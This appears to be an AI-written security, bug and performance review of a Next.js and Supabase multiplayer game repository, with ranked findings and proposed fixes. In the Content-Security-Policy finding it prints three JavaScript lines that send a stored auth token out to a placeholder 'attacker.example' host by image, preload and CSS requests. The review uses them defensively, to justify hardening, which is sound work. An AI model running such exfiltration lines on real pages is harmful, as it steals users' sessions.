# Security, bug and performance review — 2026-09-15

Full-codebase pass over `app/`, `components/`, `hooks/`, `lib/`, `src/`, `scripts/`,
`supabase/` (schema, migrations, Edge Functions), `next.config.ts` and the dependency
tree, on `claude/eager-cori-rbtq73` at `583b02d`.

**Verification performed:** `tsc --noEmit` (clean), `eslint .` (clean), `next build`
(clean), `npm audit`, and every QA gate in `package.json` — `qa:engine` (34/34),
`qa:cloud` (16/16), `qa:challenge` (10/10), `qa:metrics` (19/19), `qa:transport`
(11/11), `qa:rename` (16/16), `qa:rls` (16 probes closed, 24 behaviours intact),
`qa:username` (1,728 generated + 46 fixture names), `audio:meta` (3 cues). All pass.
`qa:mp` requires a running dev server and was not exercised.

## Headline

**No critical security vulnerability was found.** This is an unusually hardened
codebase: the injection surface is genuinely closed (no `dangerouslySetInnerHTML`,
no `eval`, no user-supplied markup anywhere, zero `as any`, `strict: true`), RLS is
column-grant-level rather than policy-level, every client-written value that reaches
another player's screen is re-validated at the read boundary, and the multiplayer
wire protocol rebuilds every inbound object field by field. The eleven findings
below are ranked by real-world severity; the top three are Medium.

| # | Bucket | Severity | Finding |
|---|---|---|---|
| S-1 | Security | Medium | CSP omits `img-src`/`media-src`/`font-src`/`style-src`, leaving a hole in its own stated exfiltration defence |
| S-2 | Security | Medium | Production dependency `fflate@0.6.10` carries GHSA-px8p-9vwx-vf98 |
| S-3 | Security | Medium | The only file holding the service-role key is excluded from typecheck *and* lint, and no CI runs the security gates |
| S-4 | Security | Low | `profile_by_friend_code` has no rate limit |
| S-5 | Security | Low | Dev-only `qs` advisories |
| S-6 | Security | Info | Scores are client-authoritative (accepted design) |
| B-1 | Bug | Medium | CSP blocks Supabase Realtime whenever the project URL is `http://` — multiplayer is dead against a local/self-hosted Supabase |
| B-2 | Bug | Low | `/opengraph-image` can 500 on a font read, and it is the fallback for every unknown `/r/{id}` unfurl |
| B-3 | Bug | Low | `startMatch` can mint a 9-seat roster that every peer silently truncates to 8 |
| P-1 | Perf | Medium | `top_results`' `DISTINCT ON` has no usable index — leaderboard cost scales with total rows, not board size |
| P-2 | Perf | Low | `hasCashflowSave()` parses the entire save to answer a boolean |

---

# 1. Security

## S-1 — [Medium] CSP: the exfiltration defence has a hole that costs nothing to close

**File:** `next.config.ts:117-127` (the `Content-Security-Policy` array)

The policy ships six directives:

```
frame-ancestors 'none'; frame-src 'none'; form-action 'self';
object-src 'none'; base-uri 'self'; connect-src 'self' <supabase> <wss>
```

The file's own rationale (lines 28-31) states the design intent plainly:

> `connect-src` below is the half that costs nothing … it does not stop an injected
> script from running, but it does stop one from phoning home, and exfiltration is
> the part of an injection that actually hurts a player.

**The risk.** `connect-src` governs `fetch`, `XHR`, `WebSocket`, `EventSource` and
`sendBeacon` — and nothing else. It does not govern the cheapest exfiltration
primitives there are:

```js
new Image().src = 'https://attacker.example/?d=' + btoa(localStorage.getItem('sb-…-auth-token'));
document.head.append(Object.assign(document.createElement('link'), {rel:'preload', as:'image', href:'https://attacker.example/?d=…'}));
el.style.backgroundImage = "url('https://attacker.example/?d=…')";
```

Those are `img-src` requests, and `img-src` is absent. So is `media-src`, `font-src`
and `style-src` — and because there is no `default-src`, an absent directive is not
restricted, it is *unrestricted*. The stated property ("stops one from phoning home")
therefore does not hold, and the defence-in-depth argument that justifies deferring
`script-src` rests on it.

This is a *defence-in-depth* gap rather than a live exploit: the premises in the
comment (no user-supplied markup, charset-locked usernames, no third-party script)
do hold today, so there is no known way to get script into the page. But the whole
point of the `connect-src` half is to be the net that catches the day one of those
premises stops holding.

**The fix** — four directives, no nonce, no middleware, no ISR cost, nothing in the
rationale changes:

```ts
const nextConfig: NextConfig = {
  // …
};

// in SECURITY_HEADERS, Content-Security-Policy value:
value: [
  "frame-ancestors 'none'",
  "frame-src 'none'",
  "form-action 'self'",
  "object-src 'none'",
  "base-uri 'self'",
  // The other half of the exfiltration story. `connect-src` covers fetch/XHR/ws;
  // these cover the primitives that do not go through it — an <img>, a preload
  // hint, a CSS url(), a webfont. No `default-src`, deliberately: it would imply
  // `script-src`, which is the expensive directive this policy defers on purpose
  // (and which would also have to name blob: for Tone.js' AudioWorklet and
  // 'wasm-unsafe-eval' for @react-three/rapier).
  //
  // `data:` and `blob:` on img-src are load-bearing: the share card renders a QR
  // code and a canvas snapshot as data URLs (components/share/drawShareCard.ts,
  // components/share/ShareCard.tsx). `style-src 'unsafe-inline'` likewise: Next
  // injects inline <style> in the App Router and framer-motion writes inline
  // style attributes on every animated node.
  "img-src 'self' data: blob:",
  "media-src 'self'",
  "font-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  connectSrc(),
].join("; "),
```

Verified against the tree: the app references **no** external asset origin at all
(`grep` for `https?://` across `app components hooks lib src` returns only
`lifepatch.app` and the Vercel host). Vercel Analytics and Speed Insights beacon to
`/_vercel/…` on this origin, so `'self'` already covers them — the same fact the
existing comment relies on.

**Explicitly do not add `default-src`.** It would imply `script-src`, which would
break Tone.js (its `standardized-audio-context` dependency instantiates an
`AudioWorklet` from a `blob:` URL) and `@react-three/rapier` (WASM compilation needs
`'wasm-unsafe-eval'` once any `script-src` exists). That is exactly the cost the
file's header documents deferring.

---

## S-2 — [Medium] Production dependency `fflate@0.6.10` — GHSA-px8p-9vwx-vf98

**File:** `package-lock.json` · path `@react-three/rapier → three-stdlib → fflate`

```
fflate  0.6.0 - 0.6.10   moderate
unzipSync can enter an infinite loop when parsing malformed ZIP64 archives
CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H) — CWE-400
```

This is a **production** path (`dev=false` in the lockfile), reached through the 3D
board (`components/cinematic/landing/BoardDiorama.tsx`, `public/board3d/`). The
practical exposure is low — the app never feeds an attacker-controlled archive to
`three-stdlib`'s loaders — but it is a live advisory on a shipped dependency, and
the fix is free.

**The fix is a one-line lockfile bump with zero semver risk.** `three-stdlib@2.36.1`
(the current latest) still declares `fflate: ^0.6.9`, so there is no upstream
release to wait for — but `fflate@0.6.11` is published, is outside the vulnerable
range, and *already satisfies* `^0.6.9`:

```bash
npm update fflate     # 0.6.10 -> 0.6.11, lockfile only
npm audit             # fflate gone
```

No `overrides` entry and no major-version jump are needed. Re-run `npm run build`
and check the landing-page board renders.

---

## S-3 — [Medium] The one file holding the service-role key is excluded from typecheck *and* lint, and nothing runs the security gates

**Files:** `tsconfig.json:28`, `eslint.config.mjs:38`, absence of `.github/`

`supabase/functions/profile/index.ts` is 337 lines that: hold
`SUPABASE_SERVICE_ROLE_KEY`, resolve the caller's JWT, own the CORS allow-list, own
the rename rate-limiter, and are the **sole writer** of `public.profiles` (the schema
revokes INSERT and UPDATE from `authenticated` precisely so this is true). It is the
highest-consequence file in the repository.

It is excluded from both static-analysis tools:

```jsonc
// tsconfig.json
"exclude": ["node_modules", "out", "supabase/functions/*/index.ts"]
```
```js
// eslint.config.mjs
ignores: [ /* … */ "supabase/functions/*/index.ts" ]
```

The exclusions are *correct* — it is Deno code with `npm:` specifiers and `.ts`
import extensions, and both files say so. The gap is that **nothing replaced them**.
A typo in a `key()` lookup, an `await` dropped from `spendRenameAttempt`, a fall-
through in the action dispatch: none of it is caught by anything in this repo. The
`// deno-lint-ignore-file no-explicit-any` at line 1 and `let admin: any` at line 133
mean the Supabase client calls inside are unchecked too.

Compounding it: **there is no CI.** No `.github/workflows`. The repository contains
an RLS attack-probe suite (`qa:rls`, 16 probes), a username-filter gate (`qa:username`,
1,774 cases), engine property tests (`qa:engine`, 34), a metrics-reader gate, a
transport gate and six more — 130+ assertions, several of them specifically
security regression tests — and not one of them runs automatically on a push.

**The fix,** two parts:

```jsonc
// package.json — Deno is already the documented runtime for these files
"scripts": {
  "check:functions": "deno check supabase/functions/*/index.ts",
  "lint:functions": "deno lint supabase/functions",
  "verify": "npm run typecheck && npm run lint && npm run check:functions && npm run qa:engine && npm run qa:cloud && npm run qa:challenge && npm run qa:metrics && npm run qa:transport && npm run qa:rename && npm run qa:username && npm run audio:meta"
}
```

```yaml
# .github/workflows/verify.yml
name: verify
on: [push, pull_request]
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '24', cache: npm }
      - uses: denoland/setup-deno@v2
        with: { deno-version: v2.x }
      - run: npm ci
      - run: npm run verify
      - run: npm audit --audit-level=moderate
```

`qa:rls` needs a live Postgres and `qa:mp` needs a dev server, so both belong in a
separate job (a `services: postgres:` container, and `npm run build && npm start &`
respectively) rather than in `verify`.

---

## S-4 — [Low] `profile_by_friend_code` has no rate limit

**File:** `supabase/schema.sql:167-182`

```sql
create or replace function public.profile_by_friend_code(code text)
returns table (id uuid, username text, avatar_seed text)
language sql security definer stable
set search_path = public
as $$
  select p.id, p.username, p.avatar_seed
  from public.profiles p
  where p.friend_code = upper(trim(code))
  limit 1;
$$;
```

The function itself is well built — a point query, at most one row, never returns the
code, so a result cannot seed the next lookup and there is no offset or ordering to
walk. But any authenticated caller may invoke it without limit, and a friend code is
the *entire* capability protecting the friends graph ("added by code, never by
search", and migration 02 exists because these codes were once enumerable).

The asymmetry is worth naming: `rename` got a **durable, atomic, per-user limiter**
(`spend_rename_attempt`, migration 09) on exactly this reasoning — two
distinguishable answers plus unlimited attempts is an oracle. `addByCode` has the
same shape (`not-found` vs `exists` vs success) and no limiter at all.

The keyspace makes it impractical rather than safe: 31⁶ ≈ 887 million codes, so even
at 1,000 req/s a 50% hit needs ~7 days per *one* account found. That is why this is
Low and not Medium. But the cost of closing it is one migration that reuses the
counter columns already on `profiles`:

```sql
-- Mirrors spend_rename_attempt (2026-09-02_09): read and write in ONE statement so
-- concurrent callers serialise on the row lock, and fail OPEN on an error, because a
-- limiter that cannot read its counter must not become an outage on adding a friend.
alter table public.profiles
  add column if not exists lookup_window_start timestamptz,
  add column if not exists lookup_attempts int not null default 0;

create or replace function public.profile_by_friend_code(code text)
returns table (id uuid, username text, avatar_seed text)
language plpgsql security definer stable
set search_path = public
as $$
declare
  cap constant int := 30;   -- per hour, per account
  allowed boolean;
begin
  update public.profiles p
     set lookup_window_start =
           case when p.lookup_window_start is null
                  or now() - p.lookup_window_start > interval '1 hour'
                then now() else p.lookup_window_start end,
         lookup_attempts =
           case when p.lookup_window_start is null
                  or now() - p.lookup_window_start > interval '1 hour'
                then 1 else p.lookup_attempts + 1 end
   where p.id = auth.uid()
   returning (p.lookup_attempts <= cap) into allowed;

  if allowed is false then
    return;  -- empty result reads as "not found", which reveals nothing
  end if;

  return query
    select q.id, q.username, q.avatar_seed
      from public.profiles q
     where q.friend_code = upper(trim(code))
     limit 1;
end;
$$;
```

Client-side, `addByCode` should surface the empty result as its existing
`not-found` — no new UI state, and no new signal for a prober.

---

## S-5 — [Low] Dev-only `qs` advisories

**Path:** `@modelcontextprotocol/sdk` / `express-rate-limit → express → body-parser → qs@6.15.3` (dev)

Two moderate advisories (GHSA-x5fp-wj9c-mxmx array-limit bypass, GHSA-4mjr-xmp4-gh2g
attacker-controlled `isBuffer` DoS). Pulled in transitively by the `shadcn` CLI,
which is a `devDependency`; `express` never runs in this project and never ships.
**No runtime exposure.** Clear it with the same `npm audit fix` pass as S-2 so the
audit output stays at zero and a real finding is not lost in the noise.

---

## S-6 — [Info] Scores are client-authoritative

Not a defect — a design decision the codebase states out loud and defends well. Worth
restating so it is not rediscovered as a finding:

- `results` is written directly by the browser under an `auth.uid() = user_id`
  policy. Score, verdict and `metrics` are whatever that browser posts.
- The defences that exist are the *right* ones for the model: bounded `score`
  (`results_score_sane`, which also refuses NaN — Postgres sorts it above every real
  number), a closed `verdict` enum (`results_verdict_known`, which stops any account
  minting an official-looking statement on your own domain), size and array bounds on
  `metrics`, column-level INSERT grants that keep `id` and `created_at` out of the
  client's hands, and a 500-row per-player cap.
- The replay check (`lib/replay.ts`, surfaced as `metrics.verified`) runs on the
  player's own device and `app/r/[id]/page.tsx:289-293` says so in the UI: *"It
  catches a run that does not add up. It is not a proof against a determined
  forger."* That is the honest framing and it should stay.

Server-authoritative scoring would mean running the engine in an Edge Function and
replaying every submitted journal — a large change, justified only if the boards
start attracting real forgery. No action recommended now.

---

# 2. Functional Bugs

## B-1 — [Medium] CSP blocks Supabase Realtime whenever the project URL is `http://`

**File:** `next.config.ts:67`

```ts
return `${SELF} ${origin} ${origin.replace(/^https:/, "wss:")}`;
```

The regex is anchored on `https:`. Against a local or self-hosted Supabase the
project URL is `http://`, the replace does not match, and the WebSocket origin is
never added — the directive emits the HTTP origin twice:

```
NEXT_PUBLIC_SUPABASE_URL=http://127.0.0.1:54321
  -> connect-src 'self' http://127.0.0.1:54321 http://127.0.0.1:54321
```

(Verified by running `connectSrc`'s logic directly.) A CSP source expression with
scheme `http` does not match a `ws:` URL — per CSP3 *match schemes*, `http` matches
only `http`/`https`; the `ws`→`http` widening runs the other direction. So the
Realtime socket to `ws://127.0.0.1:54321/realtime/v1/websocket` is refused by the
browser.

**Impact.** `http://127.0.0.1:54321` is exactly what `supabase start` prints, and
`createTransport()` (`lib/mp/transport.ts:532-537`) prefers the Supabase transport
whenever a client exists — so a developer running against a local Supabase gets
`createSupabaseTransport`, every channel subscription fails, and `joinRoom` surfaces
*"Couldn't reach the room — check your connection and try again."* after the full
12-second `JOIN_DEADLINE_MS`. The failure is indistinguishable from a dead project,
and the whole multiplayer layer is untestable against local infrastructure. The same
applies to any self-hosted Supabase behind plain HTTP. `next dev` applies
`headers()`, so it bites in development too — which is the only place it bites, which
is why this is Medium and not High.

**The fix** — one character class:

```ts
function connectSrc(): string {
  const SELF = "connect-src 'self'";
  const url = process.env.NEXT_PUBLIC_SUPABASE_URL;
  if (!url) return warnNoCloud(SELF, "NEXT_PUBLIC_SUPABASE_URL is not set");
  let origin: string;
  try {
    origin = new URL(url).origin;
  } catch {
    return warnNoCloud(SELF, `NEXT_PUBLIC_SUPABASE_URL is not a URL: ${url}`);
  }
  // `^http`, not `^https:` — a local or self-hosted project is served over plain
  // HTTP (`supabase start` prints http://127.0.0.1:54321), and an `https:`-anchored
  // replace emitted the HTTP origin twice and no socket origin at all. A CSP source
  // whose scheme is `http` does not authorise a `ws:` URL, so Realtime was refused
  // by the browser and every room join timed out looking like a dead project.
  return `${SELF} ${origin} ${origin.replace(/^http/, "ws")}`;
}
```

`https://x` → `wss://x` (unchanged), `http://127.0.0.1:54321` → `ws://127.0.0.1:54321`
(fixed).

---

## B-2 — [Low] `/opengraph-image` can 500, and it is the fallback for every unknown `/r/{id}` unfurl

**File:** `app/opengraph-image.tsx:34`

```ts
const [anton, mono] = await loadFonts();   // unguarded
```

`app/api/og/[id]/route.tsx` treats a font read as a fault it must survive, and says
why (lines 129-153): *"this route must never 500 — an unfurl that errors shows a
broken card in every chat client that renders it."* It wraps the read in
`.catch(() => null)` and falls back to redirecting at `/opengraph-image`.

`/opengraph-image` is the target of that redirect **and** of the missing-row redirect
(lines 172-180), so it now absorbs the traffic the other route sheds — and it has no
guard of its own. `cachedFonts` deliberately does not memoise a rejection (so a
transient failure is retried), which means a rejection propagates to the handler and
the route 500s. There is nothing behind it to fall back to.

The window is small (edge `fetch` of a bundled, isolate-cached asset) and it is the
same "rare, and rare is the entire case the fallback exists for" argument the sibling
route already makes.

**The fix** — give the terminal fallback a terminal fallback:

```ts
export default async function OgImage() {
  // Guarded for the reason app/api/og/[id] states: this route is that route's
  // fallback, so a 500 here has nothing behind it. Satori cannot draw without a
  // typeface, so the answer is a bare palette card rather than no card.
  const ttf = await loadFonts().catch(() => null);
  if (!ttf) {
    return new Response(
      `<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="630">` +
        `<rect width="1200" height="630" fill="${BG}"/></svg>`,
      { headers: { "content-type": "image/svg+xml", "cache-control": "no-store" } },
    );
  }
  const [anton, mono] = ttf;
  // …unchanged
}
```

`no-store` on the fault path, deliberately — the same reasoning as the
missing-font branch in `/api/og/[id]`: a platform hiccup must not be pinned at the
edge for a week by the success path's `s-maxage=604800`.

---

## B-3 — [Low] `startMatch` can mint a 9-seat roster that every peer truncates to 8

**File:** `hooks/useMatch.tsx:1868-1880`

```ts
const roster: PeerInfo[] = Object.values(peersRef.current)
  .filter((p) => p.connected)
  .sort(/* … */)
  .slice(0, MAX_PLAYERS)          // <- 8
  .map(/* … */);
if (!roster.some((r) => r.playerId === cur.hostId) && selfInfoRef.current) {
  roster.unshift(selfInfoRef.current);   // <- can make it 9
}
```

The `slice` caps at 8, then the host is prepended unconditionally if absent. On the
receiving side `parseMatchConfig` re-caps at `MAX_PLAYERS` (`lib/mp/protocol.ts:266`),
but `beginRunning(final, 1, true)` on the host consumes `final` *without* going
through the parser. Host and peers would then hold different rosters, and the dropped
player's every `status` and `snapshot` would be refused by `isRosterMember` on every
other client — a seat that exists on one machine and nowhere else, which is precisely
the divergence the frozen roster exists to prevent.

It is not reachable today: `handlePresence` builds `others` as
`visible.slice(0, MAX_PLAYERS - 1)` and then always writes `next[me]`, so `peersRef`
holds at most 8 rows *including* self and the `unshift` branch is dead. This is a
latent invariant break, not a live bug — but it is one refactor of `handlePresence`
away from being live, and the roster is an authorisation gate.

**The fix** — cap after the unshift, not before:

```ts
if (!roster.some((r) => r.playerId === cur.hostId) && selfInfoRef.current) {
  roster.unshift(selfInfoRef.current);
}
// Capped AFTER the host is prepended. `parseMatchConfig` re-caps on the way in, so a
// 9th seat would exist on this client and on no other — and every status and
// snapshot from that player would be refused by `isRosterMember` everywhere else.
roster.length = Math.min(roster.length, MAX_PLAYERS);
```

---

# 3. Code Quality / Performance

## P-1 — [Medium] `top_results`' `DISTINCT ON` has no usable index

**File:** `supabase/migrations/2026-09-02_10_top_results.sql:73-87`

```sql
select distinct on (r.user_id) r.*
  from public.results r
 where r.mode = p_mode
   and r.score > -1e15 and r.score < 1e15
   …
 order by r.user_id, r.score desc, r.id asc
```

The migration correctly replaces a 6-round-trip client-side page walk with one query.
But the indexes in `schema.sql:229-230` are `(mode, score desc)` and `(user_id)`, and
neither serves `order by user_id, score desc, id asc`. Postgres cannot do index skip
scans, so this plan reads **and sorts every row for the mode** before the outer
`limit 25` is applied — the cost of drawing a 25-row board grows with the size of the
whole table, not with the board.

With the 500-row per-player cap (`results_cap_per_player`), a 10,000-player base is up
to 5M story rows sorted on every leaderboard open, on every scope, by every visitor —
and the board is public-read, so unauthenticated traffic drives it.

**The fix** — one index that makes the `DISTINCT ON` an ordered index scan with no
sort step:

```sql
-- `top_results` (migration 10) reads `distinct on (user_id) … order by user_id,
-- score desc, id asc`. Neither results_mode_score_idx (mode, score desc) nor
-- results_user_idx (user_id) can serve that ordering, so the plan sorts every row
-- for the mode before the LIMIT. This index matches the ORDER BY exactly, so the
-- dedupe becomes an index scan and only the deduped set (one row per player) is
-- sorted for the outer `order by score desc`.
--
-- It also covers results_cap_per_player's `count(*) where user_id = … and mode = …`,
-- which today has only the single-column user index to work with.
create index if not exists results_best_per_player_idx
  on public.results (mode, user_id, score desc, id);
```

Safe to run on a live table (`concurrently` if the table is already large).
`results_user_idx` becomes redundant once this exists and can be dropped in a later
migration.

**Related, and already documented:** `README.md:44-60` offers three optional
expression indexes for the `metrics->>backgroundId` / `metrics->>daily` /
`metrics->>seed` filters. They are correct and worth applying *now* rather than
"if the table ever grows" — the Daily Ledger board is a first-class feature whose
filter is an unindexed jsonb expression on every open. (Minor doc nit: the sentence
says "two expression indexes are the fix" above a block of three.)

## P-2 — [Low] `hasCashflowSave()` parses the entire save to answer a boolean

**File:** `lib/cashflow/persist.ts:102-104`

```ts
export function hasCashflowSave(): boolean {
  return loadCashflow() !== null;
}
```

`loadCashflow()` does a full `JSON.parse` of the whole `CashflowState` — board
position, every stock/real-estate/business holding, the quote board, the turn log —
and then throws the result away. It is called from the mode select to decide whether
to offer "Continue". Re-using the loader is the *right* call for correctness (it is
what makes the "version stamp is not the validation" fix apply to both paths, and the
header says so), so this is a note rather than a defect.

If it ever shows up in a profile, the cheap version is to memoise within a tick:

```ts
let cached: { at: number; value: boolean } | null = null;
export function hasCashflowSave(): boolean {
  // Same loader, same validation — just not re-parsed once per render. Short TTL so
  // a save written in this session is still seen promptly.
  if (cached && performance.now() - cached.at < 1000) return cached.value;
  const value = loadCashflow() !== null;
  cached = { at: performance.now(), value };
  return value;
}
```
with `cached = null` added to `saveCashflow` and `clearCashflow`.

---

# 4. What was checked and found sound

Recorded so the next reviewer does not re-derive it.

- **Injection.** No `dangerouslySetInnerHTML`, `eval`, `new Function`, `innerHTML` or
  `document.write` anywhere in the tree. The only player-authored string that reaches
  another player's screen is the username, charset-locked in three places at once
  (`USERNAME_RE`, the `profiles_username_charset` CHECK, and the Edge Function that is
  the sole writer). `verdict` is a closed enum at the database.
- **SQL/PostgREST injection.** One place builds a query grammar by concatenation
  (`lib/cloud/friends.ts:167`, `.or(...)`), and it is guarded by a UUID regex on the
  line above with a comment explaining exactly why.
- **Secrets.** No hardcoded credentials. `.env*.local` is gitignored,
  `.env.local.example` carries an explicit "never paste a `sb_secret_...` key here"
  warning, and the Edge Function reads both the legacy and the new key regimes from
  the environment.
- **RLS.** `qa:rls` migrates a real Postgres and re-probes 16 attacks on both the
  migration path and a fresh `schema.sql`; all closed. The schema gets the
  policy-vs-grant distinction right, which most codebases do not — `revoke update on
  profiles from authenticated` *then* re-grant one column, because a column-level
  revoke cannot carve an exception out of a table grant.
- **Multiplayer wire.** `lib/mp/protocol.ts` rebuilds every inbound object field by
  field, never passes a reference through, clamps every number, refuses a
  cross-field-inconsistent `RunState` (`year < startYear`), fences status and snapshot
  writes behind the frozen roster *and* the presence-seated session, and bounds the
  room clock by what roster members can be shown to have reached.
- **Error handling discipline.** The house rule — supabase-js resolves with
  `{ error }` rather than rejecting, so a discarded error is a silent data-loss bug —
  is applied consistently across `saves.ts`, `results.ts`, `streaks.ts`, `profiles.ts`
  and `friends.ts`, and raw PostgREST messages are logged rather than shown to
  players.
- **Resource lifecycle.** `AudioEngine.dispose()` tracks and cancels every pending
  one-shot disposal; `createSupabaseTransport` uses a generation counter plus channel
  identity to stop a discarded channel steering the room; `ShareCard` revokes its
  object URLs; every `setInterval` and `addEventListener` found has a matching
  cleanup.
- **Static analysis.** `strict: true`, zero `as any`, zero `TODO`/`FIXME`/`HACK`,
  clean `tsc` and clean `eslint`. Every `eslint-disable` is a single line with a
  written justification.

---

# 5. Suggested order of work

1. **B-1** — one character, unblocks local multiplayer development. (`next.config.ts`)
2. **S-2 + S-5** — `npm update fflate`, then `npm audit fix`. Lockfile only.
3. **S-1** — four CSP directives. (`next.config.ts`, same edit session as B-1)
4. **S-3** — `verify` script and a CI workflow. Everything it runs already exists and
   already passes; this is wiring, and it is what keeps the rest of this list from
   regressing.
5. **P-1** — one index migration, plus the three the README already documents.
6. **B-2**, **B-3**, **P-2** — small, low-urgency, safe to batch.
7. **S-4** — one migration, when the friends graph is worth more than the keyspace.
